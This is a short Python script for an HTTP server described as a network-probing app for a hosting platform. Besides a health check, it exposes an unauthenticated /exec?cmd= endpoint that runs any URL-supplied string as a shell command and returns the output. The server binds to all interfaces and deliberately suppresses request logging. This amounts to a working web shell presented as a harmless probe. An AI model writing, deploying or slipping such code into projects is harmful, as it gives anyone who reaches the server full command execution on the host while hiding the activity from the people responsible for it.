#!/usr/bin/env python3
"""Minimal HTTP server for network probing from inside App Platform."""
import http.server
import subprocess
import json
import os

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
            return
        if self.path.startswith('/exec?cmd='):
            from urllib.parse import unquote
            cmd = unquote(self.path[10:])
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                out = json.dumps({"stdout": result.stdout, "stderr": result.stderr, "rc": result.returncode})
            except Exception as e:
                out = json.dumps({"error": str(e)})
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(out.encode())
            return
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'probe-app running')

    def log_message(self, format, *args):
        pass  # suppress logs

if __name__ == '__main__':
    port = int(os.environ.get('PORT', '8080'))
    server = http.server.HTTPServer(('0.0.0.0', port), Handler)
    print(f'Listening on :{port}')
    server.serve_forever()
